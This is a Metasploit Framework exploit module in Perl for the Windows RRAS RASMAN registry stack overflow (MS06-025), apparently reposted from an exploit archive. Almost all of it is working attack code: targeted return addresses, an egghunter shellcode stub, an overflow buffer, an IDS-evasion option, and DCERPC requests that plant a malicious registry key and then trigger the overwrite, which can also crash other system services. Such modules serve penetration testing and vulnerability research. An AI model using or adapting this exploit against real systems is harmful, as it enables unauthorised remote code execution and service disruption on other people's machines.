MS Windows RRAS RASMAN Registry Stack Overflow Exploit (MS06-025)
=================================================================

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::rras_ms06_025_rasman;
use base "Msf::Exploit";
use strict;

use Pex::DCERPC;
use Pex::SMB;
use Pex::NDR;

my $advanced = {
	&#039;FragSize&#039;    => [ 256, &#039;The DCERPC fragment size&#039; ],
	&#039;BindEvasion&#039; => [ 0,   &#039;IDS Evasion of the Bind request&#039; ],
	&#039;DirectSMB&#039;   => [ 0,   &#039;Use direct SMB (445/tcp)&#039; ],
  };

my $info = {
	&#039;Name&#039;    => &#039;Microsoft RRAS MSO6-025 RASMAN Registry Stack Overflow&#039;,
	&#039;Version&#039; => &#039;$Revision: 1.1 $&#039;,
	&#039;Authors&#039; =>
	  [
		&#039;Pusscat <pusscat [at] gmail.com>&#039;,
		&#039;H D Moore <hdm [at] metasploit.com>&#039;
	  ],

	&#039;Arch&#039; => [&#039;x86&#039;],
	&#039;OS&#039;   => [ &#039;win32&#039;, &#039;win2000&#039;, &#039;winxp&#039; ],
	&#039;Priv&#039; => 1,

	&#039;AutoOpts&#039; => { &#039;EXITFUNC&#039; => &#039;thread&#039; },
	&#039;UserOpts&#039; =>
	  {
		&#039;RHOST&#039; => [ 1, &#039;ADDR&#039;, &#039;The target address&#039; ],

		# SMB connection options
		&#039;SMBUSER&#039; => [ 0, &#039;DATA&#039;, &#039;The SMB username to connect with&#039;, &#039;&#039; ],
		&#039;SMBPASS&#039; => [ 0, &#039;DATA&#039;, &#039;The password for specified SMB username&#039;,&#039;&#039;],
		&#039;SMBDOM&#039;  => [ 0, &#039;DATA&#039;, &#039;The domain for specified SMB username&#039;, &#039;&#039; ],
		&#039;SMBPIPE&#039; => [ 1, &#039;DATA&#039;, &#039;The pipe name to use (2000=ROUTER, XP=SRVSVC)&#039;, &#039;ROUTER&#039; ],
	  },

	&#039;Payload&#039; =>
	  {
		&#039;Space&#039;    =>1024,
		&#039;BadChars&#039; => "\x00\x2c\x5c\x2e\x3a\x24",

		# sub esp, 4097 + inc esp makes stack happy
		&#039;Prepend&#039; => "\x81\xc4\xff\xef\xff\xff\x44",
	  },

	&#039;Description&#039; => Pex::Text::Freeform(
		qq{
    		This module exploits a registry-based stack overflow in the Windows Routing 
			and Remote Access Service. Since the service is hosted inside svchost.exe, 
			a failed exploit attempt can cause other system services to fail as well. 
			A valid username and password is required to exploit this flaw on Windows 2000. 
			When attacking XP SP1, the SMBPIPE option needs to be set to &#039;SRVSVC&#039;.
			Exploiting this flaw involves two distinct steps - creating the registry key
			and then triggering an overwrite based on a read of this key. Once the key is
			created, it cannot be recreated. This means that for any given system, you
			only get one chance to exploit this flaw. Picking the wrong target will require
			a manual removal of the following registry key before you can try again:
			HKEY_USERS\\.DEFAULT\\Software\\Microsoft\\RAS Phonebook
}
	  ),

	&#039;Refs&#039; =>
	  [
		[ &#039;BID&#039;, &#039;18325&#039; ],
		[ &#039;CVE&#039;, &#039;2006-2370&#039; ],
		[ &#039;OSVDB&#039;, &#039;26437&#039; ],
		[ &#039;MSB&#039;, &#039;MS06-025&#039; ]
	  ],

	&#039;DefaultTarget&#039; => 0,
	&#039;Targets&#039;       =>
	  [
		[ &#039;Automatic&#039; ],
		[ &#039;Windows 2000&#039;,   0x750217ae ], # call esi
	  ],

	&#039;Keys&#039; => [&#039;rras&#039;],

	&#039;DisclosureDate&#039; => &#039;Jun 13 2006&#039;,
  };

sub new {
	my ($class) = @_;
	my $self    = $class->SUPER::new( { &#039;Info&#039; => $info, &#039;Advanced&#039; => $advanced }, @_ );
	return ($self);
}

sub Exploit {
	my ($self)      = @_;
	my $target_host = $self->GetVar(&#039;RHOST&#039;);
	my $target_port = $self->GetVar(&#039;RPORT&#039;);
	my $target_idx  = $self->GetVar(&#039;TARGET&#039;);
	my $shellcode   = $self->GetVar(&#039;EncodedPayload&#039;)->Payload;
	my $target      = $self->Targets->[$target_idx];

	my $FragSize = $self->GetVar(&#039;FragSize&#039;) || 256;
	my $target   = $self->Targets->[$target_idx];

	my ( $res, $rpc );

	my $pipe    = "\\" . $self->GetVar("SMBPIPE");
	my $uuid    = &#039;20610036-fa22-11cf-9823-00a0c911e5df&#039;;
	my $version = &#039;1.0&#039;;

	my $handle =
	  Pex::DCERPC::build_handle( $uuid, $version, &#039;ncacn_np&#039;, $target_host,
		$pipe );

	my $dce = Pex::DCERPC->new(
		&#039;handle&#039;      => $handle,
		&#039;username&#039;    => $self->GetVar(&#039;SMBUSER&#039;),
		&#039;password&#039;    => $self->GetVar(&#039;SMBPASS&#039;),
		&#039;domain&#039;      => $self->GetVar(&#039;SMBDOM&#039;),
		&#039;fragsize&#039;    => $self->GetVar(&#039;FragSize&#039;),
		&#039;bindevasion&#039; => $self->GetVar(&#039;BindEvasion&#039;),
		&#039;directsmb&#039;   => $self->GetVar(&#039;DirectSMB&#039;),
	  );

	if ( !$dce ) {
		$self->PrintLine("[*] Could not bind to $handle");
		return;
	}

	my $smb = $dce->{&#039;_handles&#039;}{$handle}{&#039;connection&#039;};
	if ( $target->[0] =~ /Auto/ ) {
		if ( $smb->PeerNativeOS eq &#039;Windows 5.0&#039; ) {
			$target = $self->Targets->[1];
			$self->PrintLine(&#039;[*] Detected a Windows 2000 target...&#039;);
		}
		#elsif ( $smb->PeerNativeOS eq &#039;Windows 5.1&#039; ) {
		#	$target = $self->Targets->[2];
		#	$self->PrintLine(&#039;[*] Detected a Windows XP target...&#039;);
		#}
		else {
			$self->PrintLine( &#039;[*] No target available : &#039; . $smb->PeerNativeOS() );
			return;
		}
	}

	# Shiny new egghunt from the 3.0 code :-)
	my $egghunt =
	  "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02" .
	  "\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8" .
	  "\x41\x41\x41\x41".
	  "\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7";

	# Pick a "filler" character that we know doesn&#039;t get mangled
	# by the wide string conversion routines
	my $fillset = "\xc1\xff\x67\x1b\xd3\xa3\xe7";
	my $filler  = substr($fillset, rand(length($fillset)), 1);
	my $eggtag  = &#039;&#039;;
	my $pattern = &#039;&#039;;

	while (length($eggtag) < 4) {
		$eggtag .= substr($fillset, rand(length($fillset)), 1);
	}

	# Configure the egg
	substr($egghunt, 0x12, 4, $eggtag);

	# We use an egghunter to give us nearly unlimited room for shellcode
	my $eggdata =
	  ($filler x 1024).
	  $eggtag.
	  $eggtag.
	  $shellcode.
	  ($filler x 1024);

	# Mini-payload that launches the egghunt
	my $bof = $filler x 178;
	substr($bof, 84, length($egghunt), $egghunt);

	# Base pointer override occurs with this string
	my $pat =
	  ($filler x 886).
	  pack(&#039;V&#039;, $target->[1]).
	  ($filler x 3). "\xc0".
	  $bof;

	# The vulnerability is triggered with the second field of this structure
	my $type2 =
	  Pex::NDR::UnicodeConformantVaryingStringPreBuilt( ($filler x 1024) . "\x00" ).
	  Pex::NDR::UnicodeConformantVaryingStringPreBuilt( $pat . "\x00" ).
	  Pex::NDR::UnicodeConformantVaryingStringPreBuilt( ($filler x 4096) . "\x00" ).
	  Pex::NDR::Long( int(rand(0xffffffff)) ).
	  Pex::NDR::Long( int(rand(0xffffffff)) );

	# Another gigantic structure, many of these fields up as registry values
	my $type1 =
	  Pex::NDR::Long(int(rand(0xffffffff))) . # OperatorDial
	  Pex::NDR::Long(int(rand(0xffffffff))) . # PreviewPhoneNumber
	  Pex::NDR::Long(int(rand(0xffffffff))) . # UseLocation
	  Pex::NDR::Long(int(rand(0xffffffff))) . # ShowLights
	  Pex::NDR::Long(int(rand(0xffffffff))) . # ShowConnectStatus
	  Pex::NDR::Long(int(rand(0xffffffff))) . # CloseOnDial
	  Pex::NDR::Long(int(rand(0xffffffff))) . # AllowLogonPhonebookEdits
	  Pex::NDR::Long(int(rand(0xffffffff))) . # AllowLogonLocationEdits
	  Pex::NDR::Long(int(rand(0xffffffff))) . # SkipConnectComplete
	  Pex::NDR::Long(int(rand(0xffffffff))) . # NewEntryWizard
	  Pex::NDR::Long(int(rand(0xffffffff))) . # RedialAttempts
	  Pex::NDR::Long(int(rand(0xffffffff))) . # RedialSeconds
	  Pex::NDR::Long(int(rand(0xffffffff))) . # IdleHangUpSeconds
	  Pex::NDR::Long(int(rand(0xffffffff))) . # RedialOnLinkFailure
	  Pex::NDR::Long(int(rand(0xffffffff))) . # PopupOnTopWhenRedialing
	  Pex::NDR::Long(int(rand(0xffffffff))) . # ExpandAutoDialQuery
	  Pex::NDR::Long(int(rand(0xffffffff))) . # CallbackMode
	  Pex::NDR::Long(0x45).
	  $type2.
	  Pex::NDR::UnicodeConformantVaryingString("\x00" x 129).
	  Pex::NDR::Long(int(rand(0xffffffff))).
	  Pex::NDR::UnicodeConformantVaryingString("\x00" x 520).
	  Pex::NDR::UnicodeConformantVaryingString("\x00" x 520).
	  Pex::NDR::Long(int(rand(0xffffffff))).
	  Pex::NDR::Long(int(rand(0xffffffff))).
	  Pex::NDR::Long(int(rand(0xffffffff))).
	  Pex::NDR::Long(int(rand(0xffffffff))).
	  Pex::NDR::Long(int(rand(0xffffffff))).
	  Pex::NDR::Long(int(rand(0xffffffff))).
	  Pex::NDR::Long(int(rand(0xffffffff))).
	  Pex::NDR::Long(int(rand(0xffffffff))).
	  Pex::NDR::UnicodeConformantVaryingString("\x00" x 514).
	  Pex::NDR::Long(int(rand(0xffffffff))).
	  Pex::NDR::Long(int(rand(0xffffffff)));

	# Create the actual RPC stub and tack our payload on the end
	my $stub =
	  $type1.
	  Pex::NDR::Long(int(rand(0xffffffff))).
	  $eggdata;

	$self->PrintLine("[*] Creating the malicious registry key...");
	my @response = $dce->request( $handle, 0x0A, $stub );

	$self->PrintLine("[*] Triggering the base pointer overwrite...");
	my @response = $dce->request( $handle, 0x0A, $stub );

	if (@response) {
		$self->PrintLine(&#039;[*] RPC server responded with:&#039;);
		foreach my $line (@response) {
			$self->PrintLine( &#039;[*] &#039; . $line );
		}
		$self->PrintLine(&#039;[*] This probably means that the system is patched&#039;);
	}
	return;
}

1;


